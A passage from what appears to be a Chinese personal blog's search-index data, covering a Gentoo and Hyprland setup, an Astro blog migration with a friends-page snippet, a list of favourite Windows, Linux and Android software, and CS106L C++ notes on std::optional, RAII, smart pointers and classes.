(exp) [64] default/linux/amd64/23.0/split-usr/x32 (exp) [69] default/linux/amd64/23.0/musl (dev) [70] default/linux/amd64/23.0/musl/llvm (exp) [71] default/linux/amd64/23.0/musl/hardened (exp) [72] default/linux/amd64/23.0/musl/hardened/selinux (exp) [73] default/linux/amd64/23.0/split-usr/musl (dev) [74] default/linux/amd64/23.0/split-usr/musl/llvm (exp) [75] default/linux/amd64/23.0/split-usr/musl/hardened (exp) [76] default/linux/amd64/23.0/split-usr/musl/hardened/selinux (exp) 为什么这里说 split-usr，在 merge-usr 这篇 wiki 中指出，merge-usr 对于\u003e=systemd 255 来说是必需的，对于其他 init 系统来说是可选的。23.0 的除了标明 split-usr 默认都是 merge-usr 的，所以如果我目前使用的是 openrc，文件的布局默认就是 split-usr，也就先不更改了。 对我来说，我除了要 enable desktop 的 profile 之外，我还想要 enable hardened 的 profile 以带来安全上的提升。可以在Gentoo Wiki 上关于 profile 的介绍中查看到如何将两个 profile 同时 enable 说起安全性，Gentoo Linux 目前跟的是 LTS 的内核，版本目前在 6.6，不过 6.7 在安全性貌似有很多改进（存疑），所以我选择跟进 stable 的脚步（ Project:Hardened 这个项目主页介绍了 Gentoo Hardened profile 的一些细节，但是这篇文档质量貌似不是很好。 ","date":"2024-03-28","objectID":"/posts/gentooinstall_ng/:2:0","tags":["Gentoo Linux","Linux","intro"],"title":"我写的 Gentoo Linux 安装指南","uri":"/posts/gentooinstall_ng/"},{"categories":["Linux_杂谈"],"content":"WM 选择 使用的是 openrc，但我网络方面依旧选择的是 networkmanager，主要因为习惯了，其他的像 iwd，或者 wpa_supplicant 这样的 WiFi 连接工具我用的都不是很习惯（主要我是要用桌面环境的，这俩我都不知道有 tui 或者 gui 组件）。音频服务方面选择的是 pipewire，我并不想用 pulseaudio，所以只能选择 pipewire 了。根据Gentoo Wiki 关于 PipeWire 的描述，可以看出这东西还有点依赖 systemd，难绷。虽然 wiki 中关于 openrc 也给了使用它的方法。 DE 方面，我本来是想用 GNOME 的，虽然 GNOME 依赖于 systemd，但是 Gentoo Linux 做了一些工作使得可以在 openrc 上使用 GNOME，但是 GNOME 需要编译好多软件，我真的受不了了。我基于 “我真的喜欢用 Wayland” 的心理，选择使用了 Hyprland，WM 向来要比 DE 默认少装很多软件。 关于 Hyprland 的启动，我还是推荐 dbus-run-session Hyprland 这样启动，而不是直接 Hyprland。状态栏我是用的是 waybar，通知组件用的是 mako，程序启动器使用的是 wofi，Terminal 使用的是 kitty。输入法使用的是 fcitx5。 在 GNOME 中，使用 chromium 内核的软件以 Wayland 启动的话就无法使用中文输入法，需要附加 --gtk-version=4 这个 flag 才能使用，但是 Electron 的应用目前还不支持 gtk4 导致附加了 flag 也不好使。 但是在 Hyprland 中就没有这个问题，就像是 KDE Plasma 中也不会存在这个问题一样。只需要附加 --enable-wayland-ime 这个 flag 就可以了。 Chromium 内核的软件以 Wayland 启动的话会很模糊，附加 --use-gl=egl 就好了。 Hyprland 没有太好的主题设置软件，我选择的是使用 gsettings 这个软件 $ gsettings get org.gnome.desktop.interface font-name 'Noto Sans Mono 11' $ gsettings get org.gnome.desktop.interface icon-theme 'Tela' 如果把 get 改成 set 就是设置字体和主题了。 ","date":"2024-03-28","objectID":"/posts/gentooinstall_ng/:3:0","tags":["Gentoo Linux","Linux","intro"],"title":"我写的 Gentoo Linux 安装指南","uri":"/posts/gentooinstall_ng/"},{"categories":null,"content":"本次更换博客框架的相关记录","date":"2024-03-08","objectID":"/posts/btemp_move_1/","tags":["blog"],"title":"Blog 迁移记录","uri":"/posts/btemp_move_1/"},{"categories":null,"content":"本次更换博客框架的相关记录 Blog 迁移记录 我最早使用的是hexo作为博客框架，期间也换过很多主题，但没有一种主题是让我很满意的。我自己前端学的也没有多好，所以并没有自己做一个主题的想法。 后来我看到有人使用 GitBook 写Blog，但我不喜欢使用 gitbook，于是准备使用和它差不多的 mdBook，这位是用 Rust 开发，同时也是 The Rust Programming Language 所使用的软件，但我用的时候才发现，这位默认的颜值不咋好看，而且搜索功能简陋（不支持 CJK）。 于是我选择了 MkDocs，这位是我刷到 CTF Wiki 的时候找到的文档生成软件。简单搜索发现它有一个 Material for MkDocs 主题，于是就换到了这里。不过这位其实有些问题——它不是Blog，所以当用它作为我的 Blog 站点生成器的时候，总有一种别扭的感觉。 前几天看到一个前端框架：astro。看了一下主题感觉真的好漂亮，并且貌似性能也还好？我使用的是 astro-paper 这个主题。 不过这个主题没有友链，于是我自己简单的修改了一下： 我简单看了一下，它的 src/components/Header.astro 文件用于显示上边栏，于是： 找到下边这行并修改成我给的这样： posts\" | \"tags\" | \"about\" | \"search\" | \"friends\"; \u003cli\u003e \u003ca href=\"/tags/\" class={activeNav === \"tags\" ? \"active\" : \"\"}\u003e Tags \u003c/a\u003e \u003c/li\u003e \u003cli\u003e \u003ca href=\"/about/\" class={activeNav === \"about\" ? \"active\" : \"\"}\u003e About \u003c/a\u003e \u003c/li\u003e 在上面这块代码的下边添加： \u003cli\u003e \u003ca href=\"/friends/\" class={activeNav === \"friends\" ? \"active\" : \"\"}\u003e Friends \u003c/a\u003e \u003c/li\u003e 在 src/pages 文件夹下新建 friends/index.astro 文件并添加以下内容： --- import Layout from \"@layouts/Layout.astro\"; import Main from \"@layouts/Main.astro\"; import Header from \"@components/Header.astro\"; import Footer from \"@components/Footer.astro\"; import LinkButton from \"@components/LinkButton.astro\"; import { SITE } from \"@config\"; --- \u003cLayout title={`Friends | ${SITE.title}`}\u003e \u003cHeader activeNav=\"friends\" /\u003e \u003cMain pageTitle=\"Friends\" pageDesc=\"Friendly link collection.\"\u003e \u003cLinkButton className=\"underline decoration-dashed underline-offset-4 hover:text-skin-accent\" href=\"https://xxxx.xxx\" /\u003e \u003c/Main\u003e \u003cFooter /\u003e \u003c/Layout\u003e 这样就可以添加友链了。 不过这样的实现方式太粗糙了，不过我暂时也没太想出来什么比较好的解决方案。 ","date":"2024-03-08","objectID":"/posts/btemp_move_1/:0:0","tags":["blog"],"title":"Blog 迁移记录","uri":"/posts/btemp_move_1/"},{"categories":["杂谈"],"content":"自己常用软件的记录及点评","date":"2024-03-01","objectID":"/posts/dailytools/","tags":["misc","linux","intro"],"title":"常用软件记录","uri":"/posts/dailytools/"},{"categories":["杂谈"],"content":"自己常用软件的记录及点评 常用软件记录 这里会记录尝试用的软件以便于后续使用，平台上会分为 Windows，GNU/Linux和 Android，Windows 用的不多，因为和 GNU/Linux 重了的话我会在GNU/Linux 体现出来。 ","date":"2024-03-01","objectID":"/posts/dailytools/:0:0","tags":["misc","linux","intro"],"title":"常用软件记录","uri":"/posts/dailytools/"},{"categories":["杂谈"],"content":"Windows NVIDIA Broadcast 这个软件仅在 Windows 上可用，虽然我会给相机和麦克风开一些功能，不过目前也不太能用到说实话。 VMware 分为 VMware Workstation Player 和 VMware Workstation Pro。前者免费使用，后者需要付费，虽然也可以知道体验一会的方法就是了 VMware Workstation Pro 现在已经免费分发了。这是一个体验不错的虚拟机平台，提供了 Windows 版本和 Linux 版本，但是我也只是在 Windows 中使用它了。 Visual Studio 是 Windows 上体验还不错的 IDE，就是对我来说功能有些繁杂了🫠。不过我在 Windows 上目前还不太习惯用这个 IDE，还是用 vscode 连 WSL 上的 Linux 虚拟机。 WingetUI 是一个图形化的 winegt 管理软件，不过它还支持 pip，npm 什么的。不过我主要用来更新 winget 的包。 Everything 是一个高效地文件搜集工具，支持很多高级搜集的玩法，不过我一般都输入文件名来搜（逃 Geek Uninstaller 是一个更有效的卸载软件的解决方案，可以在卸载后检索是否有残留的文件或注册表。 LocalSend 是用于局域网内互相传文件的，支持 Windows，macOS，Linux，Android 和 iOS。我没有 iOS 和 macOS的设备，所以很多时候我的需求都是 Windows 和 Android，或者是 Linux 和 Android 之间传文件，实际上这种情景可以用 adb 来传文件，我曾经使用 Arch Linux 的时候，还是习惯于使用 adb 传文件的，但是在 Windows 下，我总是不习惯使用终端操作，所以会使用这个软件来传文件。 ","date":"2024-03-01","objectID":"/posts/dailytools/:1:0","tags":["misc","linux","intro"],"title":"常用软件记录","uri":"/posts/dailytools/"},{"categories":["杂谈"],"content":"GNU/Linux ","date":"2024-03-01","objectID":"/posts/dailytools/:2:0","tags":["misc","linux","intro"],"title":"常用软件记录","uri":"/posts/dailytools/"},{"categories":["杂谈"],"content":"Browser FireFox 应该大多数人用的发行版的软件库中都会有自己构建的版本，也不用从这里下载了。我一般是搭配 Arkenfox 项目和一些插件（如Ublock Origin）使用。作为一个难得非 Chromium 内核的项目，FireFox 到现在总有一种落日余晖的样子，Mozilla 宣言还是说的很好的，上次看到类似的还是网络独立宣言。不过 FireFox 在安全性方面倒貌似一直在被吐槽的样子：比如这个关于 FireFox 和 Chromium 对比的文章：Firefox and Chromium；和 GrapheneOS 中对自己在浏览器选择的叙述：Usage guide | GrapheneOS: Web browsing。不过在 GNU/Linux 中，Firefox 在 Wayland 桌面协议下的运行还基本正常，基于 Chromium 内核的浏览器现在默认还不是 Wayland。不过貌似 Mozilla 的工作重心已经不再是 Firefox 了？ Brave 是基于 Chromium 内核做的浏览器，内置 Brave 自己做的 adblock-rust，并且还做了很多其他对增强隐私方面的改动。在一个浏览器默认情况下的隐私保护比较中可以发现 Brave 的隐私保护做的比其他浏览器要好一些。不过 Brave 也被吐槽过（比如把网站显示的别人家的广告替换成自家的，虽然这是它盈利的手段）。Hacker News的讨论中中有提到一些。还有就是所有基于 Chromium 内核的软件在 Wayland 上都会存在一点点问题，比如默认没有使用 Wayland，使用了的话可能窗口缩放不太对并且 Fcitx5 使用不了等。 ","date":"2024-03-01","objectID":"/posts/dailytools/:2:1","tags":["misc","linux","intro"],"title":"常用软件记录","uri":"/posts/dailytools/"},{"categories":["杂谈"],"content":"Develop Tools vscodium 去除了 Microsoft 加入的遥测跟踪等在他们看来不 FOSS 的东西，因此它的插件商店下载不到微软官方出的一些插件（比如 Remote-ssh 等），微软官方的 C/C++ 这个插件虽然无法从插件商店下载到，但可以手动从 GitHub 上下载插件，然后导入到 vscodium 中正常使用。但是 Remote-ssh 导入后是无法使用的。我使用的 clangd 替代微软官方的 cpptools，结果本地的 clangd 所在目录不被 vscodium 检测，我还得在设置里手动指定是 /usr/lib/llvm/17/bin/clangd。不过 cpptools 在我认知中还是有东西的，比如对 GDB 的支持 😇，所以如果用 clangd 的话可以尝试全面拥抱 clang/llvm，用 lldb（逃。而且 cpptools 还支持对 Doxygen 注释格式的解析，clangd 还不支持这个功能。 Bear 可以生成一个 clang 工具链解析的编译记录文件。用来让 vscode 的 clangd 解析并理清项目的编译依赖关系。 strace 可以 trace 系统调用，虽然我其实用的不多，不过偶尔还是有些用处的（比如我曾经好奇 neofetch 是从哪里 fetch 到这些信息的，但是我又懒得去看源代码，于是就 trace 了一下 neofetch 的系统调用，看看它 open 了哪些文件）。相应的还有 ltrace，ftrace 什么的，前者可以 trace 动态链接库函数的调用，后者 trace 的是内核函数好像。不过这俩个我就完全没用过了。 QEMU 基本大多数使用的发行版的软件包仓库都会自带。通常会搭配 libvirt 和 virt-manager 来使用，libvirt 可以更好的管理 QEMU，而 virt-manager 则作为libvirt 的前端供用户使用。 ","date":"2024-03-01","objectID":"/posts/dailytools/:2:2","tags":["misc","linux","intro"],"title":"常用软件记录","uri":"/posts/dailytools/"},{"categories":["杂谈"],"content":"Video \u0026 Music SMPlayer 是 mpv 的前端，界面不好看，不过我播放视频的时候都全屏播放了，也就太没在意这个。 YesPlayMusic 是一个很漂亮的网易云第三方客户端，去除了一些社区相关的功能。它集成了一些第三方音乐源，可以播放其他源的音乐。不过它使用了 Electorn，如果介意的话，可以选择使用其他的软件。 listen1_desktop 是一个那种全网综合的音乐播放器，就是界面我感觉不咋好看。 ","date":"2024-03-01","objectID":"/posts/dailytools/:2:3","tags":["misc","linux","intro"],"title":"常用软件记录","uri":"/posts/dailytools/"},{"categories":["杂谈"],"content":"Input Method fcitx5 是一个输入法框架。都什么年代了还在用 fcitx4，都来用 fcitx5（bushi）。fcitx5 我会搭配 fcitx5-rime 使用，因为我倾向于用雾凇拼音。不过很多人喜欢使用 fcitx + 搜狗输入法，但是搜狗仍不支持 fcitx5。 ibus 是 GNOME 默认使用的输入法框架，目前我使用 GNOME 这个桌面环境的时候就会用 ibus，一般也是搭配 ibus-rime 使用，理由同上。 ","date":"2024-03-01","objectID":"/posts/dailytools/:2:4","tags":["misc","linux","intro"],"title":"常用软件记录","uri":"/posts/dailytools/"},{"categories":["杂谈"],"content":"Misc KeePassXC 是一个本地存储的密码管理器，我升级到 KDE Plasma 6 之后居然是无法正常以 Wayland 协议运行这个它，不过好像附加了 QT_WAYLAND_FORCE_DPI=physical 环境变量就可以？ flatpak 是个好东西，我有一些软件就是从 flathub 上搜索有没有，然后用 flatpak 下载的（比如wemeet，linuxqq）。使用的话最好可以再下载 Flatseal，可以对 flatpak 上下载软件进行更加精细的权限控制。 IntelOne Mono 是一个在我看来很酷的字体🤗，它用它鲜明的形体在我心中占据了很大的位置，很长一段时间，我看其他字体没有那样鲜明的花括号总感觉不是很得劲。 gnome-tweaks 对于使用 GNOME 的我来说，真的是个好软件🥹。GNOME 自带的设置（gnome-control-center）并不可以分数缩放，我只能使用 gnome-tweaks，大多数发行版都是 gnome-tweaks 这个软件包名，不过有的可能前面带个 gnome3-。 lsd 是更加 modern 的 ls 的实现，使用的 Rust 编写，在 list 的同时还可以显示图标，而且还是彩色输出，而且文件大小还会带单位输出。 ","date":"2024-03-01","objectID":"/posts/dailytools/:2:5","tags":["misc","linux","intro"],"title":"常用软件记录","uri":"/posts/dailytools/"},{"categories":["杂谈"],"content":"GNOME extensions AppIndicator and KStatusNotifierItem Support 实现了 GNOME 上的应用托盘，应用托盘还是有点必要的（目前在我看来是这样）。 Blur my Shell 可以让 gnome-shell 启用模糊效果，还是有些意思的。 Caffeine 可以让你 ban 掉你的屏保一段时间，生活中总会偶尔遇到希望长时间不要休眠，但是自身还不想老操作该电脑以防止休眠这样的情况，我自认为就是在这时候会用到。 Extension List 可以让你直接在屏幕右上角启用插件，或者进入插件的设置等等。 GSConnect 是 GNOME 上的 KDE connect 的完全实现。 Input Method Panel实现了一套输入法面板，如果你和我一样在 Wayland 下的GNOME中使用着 Fcitx5 的话就可以用到这个了，而且这个装完之后，托盘的图标也跟着改了，挺不错的。 ","date":"2024-03-01","objectID":"/posts/dailytools/:2:6","tags":["misc","linux","intro"],"title":"常用软件记录","uri":"/posts/dailytools/"},{"categories":["杂谈"],"content":"Android ","date":"2024-03-01","objectID":"/posts/dailytools/:3:0","tags":["misc","linux","intro"],"title":"常用软件记录","uri":"/posts/dailytools/"},{"categories":["杂谈"],"content":"Browser Mull 这个浏览器基于 FireFox，不过内置了 Arkenfox 项目，加强了 Firefox 的隐私保护功能，搭配 Ublock Origin 更好一些。 Brave 是基于 Chromium 内核做的浏览器，内置 Adblock 还是什么拦截广告的插件，效果还不错。有些评价参见 GNU/Linux 中对 Brave 的描述。 Bromite 是基于 Chromium 内核做的，集成了广告拦截和对隐私保护做了一些改动，具体可以看这个项目的 README。 ","date":"2024-03-01","objectID":"/posts/dailytools/:3:1","tags":["misc","linux","intro"],"title":"常用软件记录","uri":"/posts/dailytools/"},{"categories":["杂谈"],"content":"2FA Aegis 是一个 2FA 客户端，不过我也不常用双因素验证。 ","date":"2024-03-01","objectID":"/posts/dailytools/:3:2","tags":["misc","linux","intro"],"title":"常用软件记录","uri":"/posts/dailytools/"},{"categories":["杂谈"],"content":"Root/Xposed Magisk 很出名了，也就不过多介绍了。 KernelSU 的优点在于使用GKI2内核的手机基本可以从 GitHub Release 页面上下载打好 patch 的 boot 镜像从而直接刷入，不同于 Magisk 的是，ksu 运行在内核态，貌似可以更好的隐藏自身，并且不像 Magisk 那样不打 hide 就暴露 su 给对方，ksu 是选择给特定应用权限，并且可以通过 App Profile 更加细致化权限的授予。不过 Magisk 有集成的 Zygisk 和 system-hosts，而 ksu 需要模块才能拥有对应的功能：ZygiskNext 和 Ownersystemless-hosts-KernelSU-module 。ksu 还自带一个救砖功能：救砖。不过可惜的是 ZygiskNext 项目已经停更了。（ZygiskNext 目前是发行闭源二进制包） LSPosed 是一个现代化的 xposed 框架，lsp 本身也很出名了，可惜停更了。 ","date":"2024-03-01","objectID":"/posts/dailytools/:3:3","tags":["misc","linux","intro"],"title":"常用软件记录","uri":"/posts/dailytools/"},{"categories":["杂谈"],"content":"IM 微信这个B软件我是真不想用，但又不得不用。 QQ 这个B软件同样也不想用，但是也还是得用。 Telegram-FOSS 采用了更加 FOSS 的组件构建了一个 Telegram 的客户端。这个软件可以当一个云盘用还是可以的，虽然这个B软件也很扯淡。我倒希望能用一个和个人信息无关的IM，可惜没什么人用啊，虽然可能很多人用了之后就应该会变成个人信息相关了。 ","date":"2024-03-01","objectID":"/posts/dailytools/:3:4","tags":["misc","linux","intro"],"title":"常用软件记录","uri":"/posts/dailytools/"},{"categories":["杂谈"],"content":"Anti-Ad AdAway 是一个可以使用 root 权限下替换 hosts 文件来做到拦截广告的目的的软件，它同样有个 VPN 模式，不过我没用过，说起 VPN 模式，RethinkDNS 就是 VPN 模式的，看起来蛮不错，可惜我的 VPN 模式已经有软件了。adaway 的功能主要就是替换 hosts 文件，不过 hosts 文件必须写死了 URL，无法做到匹配子域名等功能，对于 anti-ad 这样的软件来说，还是很难绷的。 blocker 是一款操作 Android 应用程序四大组件的程序，比如一些广告，分析的服务直接可以禁掉。感觉 Appmanager 也能做到这一点，但是不像这位提供了规则仓库用于直接统一杀掉。 ","date":"2024-03-01","objectID":"/posts/dailytools/:3:5","tags":["misc","linux","intro"],"title":"常用软件记录","uri":"/posts/dailytools/"},{"categories":["杂谈"],"content":"App store Neo-Store 是一个第三方的 F-Droid 客户端，它颜值上要更加好看，并且还支持后台安装。 Aurora Store 是一个第三方的 Google Play 客户端，支持匿名浏览。 Obtainium 是一个使用类似 RSS 订阅的方式管理各种不同软件来源的软件。比如 GitHub，GitLab，Codeberg 等上面的 Android 软件仓库都可以跟踪管理。Neo-Store 上的软件有的和 GitHub Release 上发布新版本会隔一段时间，所以我倾向于使用 Obtainium 去跟踪开源软件的更新，除非它只能在 F-Droid 上下载。 ","date":"2024-03-01","objectID":"/posts/dailytools/:3:6","tags":["misc","linux","intro"],"title":"常用软件记录","uri":"/posts/dailytools/"},{"categories":["杂谈"],"content":"Video PipePipe 可以匿名播放 Youtube/BiliBili 等网站的视频，也可以关注那些 up主，可以将 Youtube 和 BiliBili 上的视频收藏到一个收藏夹里，可以的。但无法看到动态，这导致了我不怎么太使用这个软件。 mpv-android 是使用 libmpv 的视频播放器，由于我在使用 GNU/Linux 发行版的时候基本都会选择使用 mpv 作为视频播放器的后端，所以手机 Android 上也如此了。 ","date":"2024-03-01","objectID":"/posts/dailytools/:3:7","tags":["misc","linux","intro"],"title":"常用软件记录","uri":"/posts/dailytools/"},{"categories":["杂谈"],"content":"Misc StorageRedirect。存储空间隔离就应该被 Android 实现成为自带的功能。貌似 GrapheneOS 的 storage-scopes 实现了类似的功能，可惜GrapheneOS 是给 Google Pixel 构建的，我目前还没用过 Google Pixel。 App Ops 是一个很精细的权限控制软件，系统软件或是用户软件的权限都可以被调控，希望也可以成为默认的隐私控制面板。 KDE Connect 是一个手机和电脑联动的软件，从名字也能看出，这是 KDE Plasma 的东西。GNOME有个插件 GSConnect 旨在实现一个 GNOME 上的 KDE connect。 ","date":"2024-03-01","objectID":"/posts/dailytools/:3:8","tags":["misc","linux","intro"],"title":"常用软件记录","uri":"/posts/dailytools/"},{"categories":["杂谈"],"content":"Input Method fcitx5-android 是 Fcitx5 在 Android 上的移植。我要用的话一般搭配 RIME 插件，然后使用雾凇拼音，不过这样的体验不如 PC 端的。 ","date":"2024-03-01","objectID":"/posts/dailytools/:3:9","tags":["misc","linux","intro"],"title":"常用软件记录","uri":"/posts/dailytools/"},{"categories":["Cpp","刷课笔记"],"content":"CS106L 中关于 Type 和 RAII 的部分","date":"2024-02-05","objectID":"/posts/cs106l_type_raii/","tags":["CS106L notes","Cpp notes"],"title":"CS106L: Type \u0026 RAII","uri":"/posts/cs106l_type_raii/"},{"categories":["Cpp","刷课笔记"],"content":"CS106L 中关于 Type 和 RAII 的部分 Type \u0026 RAII ","date":"2024-02-05","objectID":"/posts/cs106l_type_raii/:0:0","tags":["CS106L notes","Cpp notes"],"title":"CS106L: Type \u0026 RAII","uri":"/posts/cs106l_type_raii/"},{"categories":["Cpp","刷课笔记"],"content":"Type \u0026 std::optional ","date":"2024-02-05","objectID":"/posts/cs106l_type_raii/:1:0","tags":["CS106L notes","Cpp notes"],"title":"CS106L: Type \u0026 RAII","uri":"/posts/cs106l_type_raii/"},{"categories":["Cpp","刷课笔记"],"content":"Type Conversion C++提供了更好的类型转换（相比于 C 那样直接写括号的强制类型转换） static_cast 和 dynamic_cast class Base { // ... }; class Derived : public Base { // ... }; Derived derivedObj; Base* basePtr = static_cast\u003cBase*\u003e(\u0026derivedObj); 就像这个 static_cast，会在编译时检验转换是否合法。 ","date":"2024-02-05","objectID":"/posts/cs106l_type_raii/:1:1","tags":["CS106L notes","Cpp notes"],"title":"CS106L: Type \u0026 RAII","uri":"/posts/cs106l_type_raii/"},{"categories":["Cpp","刷课笔记"],"content":"std::optional std::optional interface： .value() 返回包含的值或抛出 bad_optional_access 错误。 .value_or(valueType val) 返回包含的值或默认值 val（参数）。 .has_value() 如果存在包含的值，则返回 true；否则返回 false。 std::optional\u003cStudent\u003e lookupStudent(string name){ /*something*/ } std::optional\u003cStudent\u003e output = lookupStudent(“Keith”); if(student.has_value()){ cout \u003c\u003c output.value().name \u003c\u003c “ is from “ \u003c\u003c output.value().state \u003c\u003c endl; } else { cout \u003c\u003c “No student found” \u003c\u003c endl; } 使用 std::optional 返回值的优点： 函数签名可以创建更具信息性的合约（contracts）。 类的函数调用具有保证和可用的行为。 缺点： 你需要在每个地方使用 .value()。 （在 C++中）仍然可能出现 bad_optional_access 错误。 （在 C++中）optional 也可能具有 undefined behavior（*optional 与 .value() 执行相同的操作，没有错误检查）。 在许多情况下，开发者希望有 std::optional\u003cT\u0026\u003e，但实际上并没有这个类型。 std::optional 的 monadic 接口（C++23）： .and_then(function f) 如果存在包含的值，则返回调用 f(value) 的结果，否则返回 null_opt（f 必须返回 optional 类型）。 .transform(function f) 如果存在包含的值，则返回调用 f(value) 的结果，否则返回 null_opt（f 必须返回 optional 类型）。 .or_else(function f) 如果存在值，则返回该值，否则返回调用 f 的结果 那样代码就可以这么写： std::optional\u003cStudent\u003e lookupStudent(string name){/*something*/} std::optional\u003cStudent\u003e output = lookupStudent(“Keith”); auto func = (std::optional\u003cStudent\u003e stu)[] { return stu ? stu.value().name + “is from “ + to_string(stu.value().state) : {}; } cout \u003c\u003c output.and_then(func).value_or(“No student found”); ","date":"2024-02-05","objectID":"/posts/cs106l_type_raii/:1:2","tags":["CS106L notes","Cpp notes"],"title":"CS106L: Type \u0026 RAII","uri":"/posts/cs106l_type_raii/"},{"categories":["Cpp","刷课笔记"],"content":"RAII ","date":"2024-02-05","objectID":"/posts/cs106l_type_raii/:2:0","tags":["CS106L notes","Cpp notes"],"title":"CS106L: Type \u0026 RAII","uri":"/posts/cs106l_type_raii/"},{"categories":["Cpp","刷课笔记"],"content":"intro The best example of why I shouldn’t be in marketing. I didn’t have a good day when I named that – Bjarne Stroustrup (daddy of C++) std::string EvaluateSalaryAndReturnName(int idNumber){ Employee*e = new Employee(idNumber); if(e-\u003eTitle() == \"CEO\" || e-\u003eSalary() \u003e 100000){ std::cout \u003c\u003c e-\u003eFirst() \u003c\u003c \" \" \u003c\u003c e-\u003eLast() \u003c\u003c \" is overpaid\" \u003c\u003cstd::endl; } auto result = e-\u003eFirst() + \" \" + e-\u003eLast(); delete e; return result; } 对于这个函数，有很多地方可能导致内存泄露，即在 delete 之前的异常退出该函数从而导致在 heap 上的内存没有 free。所以我们需要 try-catch。 关于异常安全 不抛出异常：noexcept 关键字保证函数不会因为异常而导致一些 undefined behavior。这会出现在析构函数，swap，移动构造函数之类的。 在 Google C++ Style Guide 中，Google 提到不建议使用异常。 理由： On their face, the benefits of using exceptions outweigh the costs, especially in new projects. However, for existing code, the introduction of exceptions has implications on all dependent code. If exceptions can be propagated beyond a new project, it also becomes problematic to integrate the new project into existing exception-free code. Because most existing C++ code at Google is not prepared to deal with exceptions, it is comparatively difficult to adopt new code that generates exceptions. Given that Google’s existing code is not exception-tolerant, the costs of using exceptions are somewhat greater than the costs in a new project. The conversion process would be slow and error-prone. We don’t believe that the available alternatives to exceptions, such as error codes and assertions, introduce a significant burden. Our advice against using exceptions is not predicated on philosophical or moral grounds, but practical ones. Because we’d like to use our open-source projects at Google and it’s difficult to do so if those projects use exceptions, we need to advise against exceptions in Google open-source projects as well. Things would probably be different if we had to do it all over again from scratch. This prohibition also applies to exception handling related features such as std::exception_ptr and std::nested_exception. 来自 ChatGPT@Poe 的中文翻译： 在表面上，使用异常的好处超过了成本，尤其是在新项目中。然而，对于现有的代码来说，引入异常会对所有相关的代码产生影响。如果异常可以传播到新项目之外，将新项目整合到现有的无异常代码中也会带来问题。由于 Google 大部分现有的 C++代码都没有准备好处理异常，采用生成异常的新代码相对困难。 考虑到 Google 现有的代码不具备异常容忍性，使用异常的成本要略高于在新项目中的成本。转换过程将会缓慢且容易出错。我们认为，异常的替代方案（如错误码和断言）并不会引入重大负担。 我们反对使用异常的建议并非基于哲学或道德的立场，而是出于实际考虑。因为我们希望在 Google 使用我们的开源项目，但如果这些项目使用异常，那么在使用过程中会变得困难。如果我们从头开始重新做，情况可能会有所不同。 这个禁令也适用于与异常处理相关的特性，如 std::exception_ptr 和 std::nested_exception。 ","date":"2024-02-05","objectID":"/posts/cs106l_type_raii/:2:1","tags":["CS106L notes","Cpp notes"],"title":"CS106L: Type \u0026 RAII","uri":"/posts/cs106l_type_raii/"},{"categories":["Cpp","刷课笔记"],"content":"RAII RAII: Resource Acquisition Is Initialization 这个技术还有几个叫法： SBRM: Scope Based Memory Management CADRE: Constructor Acquires, Destructor Releases 从后两个的全拼能看出来，RAII 就是利用了类在超出作用域范围的时候就自动调用析构函数这一点，将 new 和 delete 放到构造函数和析构函数中。 比如在 open 一个文件的时候，不应该先用 ifstream 创建一个变量，然后调用 open 函数，而是直接 ifstream input(\"test.txt)，这就是 RAII 的写法，这样也不需要在后面写 input.close() 了。 锁也有类似的：lock_guard 在 C++ Core Guidelines 也有相关描述: R.11: Avoid calling new and delete explicitly ","date":"2024-02-05","objectID":"/posts/cs106l_type_raii/:2:2","tags":["CS106L notes","Cpp notes"],"title":"CS106L: Type \u0026 RAII","uri":"/posts/cs106l_type_raii/"},{"categories":["Cpp","刷课笔记"],"content":"Smart Pointers std::unique_ptr\u003ctypename Tp\u003e; std::shared_ptr\u003ctypename Tp\u003e; std::weak_ptr\u003ctypename Tp\u003e; unique_ptr unique_ptr，唯一持有自己的资源并在被销毁的时候用析构函数释放。唯一持有为了防止复制后发生重复的 free。 void rawPtrFn(){ Node* n = new Node(); // do something delete n; } // use unique_ptr void rawPtrFn(){ std::unique_ptr\u003cNode\u003e n(new Node); //do something } unique_ptr 无法被复制，但可以通过 std::move 移动： std::unique_ptr\u003cPoint\u003e u3 = std::make_unique\u003cPoint\u003e(2, 3); std::unique_ptr\u003cPoint\u003e u4 = std::move(u3); shared_ptr shared_ptr 可以复制，当所有指向这个资源的 shared_ptr 都死掉后就 free 掉这块内存。shared_ptr 用引用计数实现了这一点。 weak_ptr weak_ptr 类似于 shared_ptr，但是没有引用计数。 ","date":"2024-02-05","objectID":"/posts/cs106l_type_raii/:2:3","tags":["CS106L notes","Cpp notes"],"title":"CS106L: Type \u0026 RAII","uri":"/posts/cs106l_type_raii/"},{"categories":["Cpp","刷课笔记"],"content":"CS106L 中关于类的部分","date":"2024-02-04","objectID":"/posts/cs106l_class_op/","tags":["CS106L notes","Cpp notes"],"title":"CS106L: Class","uri":"/posts/cs106l_class_op/"},{"categories":["Cpp","刷课笔记"],"content":"CS106L 中关于类的部分 Class A struct simply feels like an open pile of bits with very little in the way of encapsulation or functionality. A class feels like a living and responsible member of society with intelligent services, a strong encapsulation barrier, and a well defined interface Bjarne Stroustrup ","date":"2024-02-04","objectID":"/posts/cs106l_class_op/:0:0","tags":["CS106L notes","Cpp notes"],"title":"CS106L: Class","uri":"/posts/cs106l_class_op/"},{"categories":["Cpp","刷课笔记"],"content":"构造函数初始化列表 Student(std::string name, std::string state, int age): name(name), state(state), age(age){ } 函数体内部还是可以写代码的 ","date":"2024-02-04","objectID":"/posts/cs106l_class_op/:1:0","tags":["CS106L notes","Cpp notes"],"title":"CS106L: Class","uri":"/posts/cs106l_class_op/"},{"categories":["Cpp","刷课笔记"],"content":"关于 delete array 作为一个基础的类型，当开发者手动为此创建内存之后也可以之后手动释放掉： //int * is the type of an array variable int *my_int_array; //this is how you initialize an array my_int_array = new int[10]; //this is how you index into an array int one_element = my_int_array[0]; delete [] my_int_array; delete 一般在类的析构函数中出现（需要手动掉释放这块内存） 这里那个虚函数等于 0 的意义在于，让继承它的类必须实现该函数，否则编译失败。这种虚函数叫作纯虚函数（pure virtual function 一个类存在一个纯虚函数就叫作抽象类，抽象类不能被实例化。 如何子类不想要实现自己的构造函数，可以： 如果是析构函数可能有点麻烦，如果有一个基类（这个类的析构函数不是虚函数）的指针指向派生类，并且这时候要 delete 这个指针就不会调用派生类的析构函数。如果基类的析构函数实现为虚函数，那么才可以正常调用派生类的析构函数释放内存。 如果基类的虚函数有实现了，并且派生类想要调用，可以这么写： t.Drink::make(); ","date":"2024-02-04","objectID":"/posts/cs106l_class_op/:2:0","tags":["CS106L notes","Cpp notes"],"title":"CS106L: 